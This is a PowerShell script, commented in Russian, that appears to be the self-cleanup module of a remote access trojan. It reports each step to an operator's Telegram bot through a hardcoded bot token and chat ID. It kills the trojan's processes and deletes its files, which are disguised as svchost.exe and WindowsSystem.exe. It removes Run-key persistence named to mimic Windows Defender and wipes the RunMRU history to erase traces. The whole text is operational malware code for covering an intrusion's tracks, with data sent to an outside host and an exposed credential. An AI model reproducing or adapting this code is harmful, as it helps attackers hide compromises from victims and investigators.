# cleanup.ps1 - Скрипт полной очистки RAT

$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

function Send-Telegram {
    param([string]$Message)
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null
    } catch { }
}

# Отправляем начало очистки
Send-Telegram "🔍 Начинается полная очистка RAT..."

# 1. Завершаем все процессы RAT
Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

$processes = Get-Process | Where-Object {
    $_.ProcessName -eq "powershell" -or 
    $_.ProcessName -eq "pwsh" -or
    $_.ProcessName -eq "cmd"
}

foreach ($process in $processes) {
    try {
        $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
        if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*") {
            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

# 2. Удаляем файлы RAT
Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

$filesToDelete = @(
    "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
    "$env:TEMP\WindowsSystem.exe",
    "$env:TEMP\cleanup_*.ps1"
)

$deletedFiles = @()
foreach ($filePattern in $filesToDelete) {
    try {
        Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
            $deletedFiles += $_.FullName
        }
    } catch { }
}

# 3. Очищаем автозагрузку реестра
Send-Telegram "🔄 Этап 3: Очистка реестра"

$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

$regEntries = @()
foreach ($regPath in $regPaths) {
    try {
        $value = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
        if ($value) {
            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
            $regEntries += "$regPath\Windows Defender Security"
        }
    } catch { }
}

# 4. Очищаем историю RUN
Send-Telegram "🔄 Этап 4: Очистка истории RUN"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

# 5. Финальный отчет
$report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
$($deletedFiles -join "`n")

Удаленные записи реестра:
$($regEntries -join "`n")

Все следы RAT успешно удалены.
"@

Send-Telegram $report

# Завершаем скрипт
exit 0
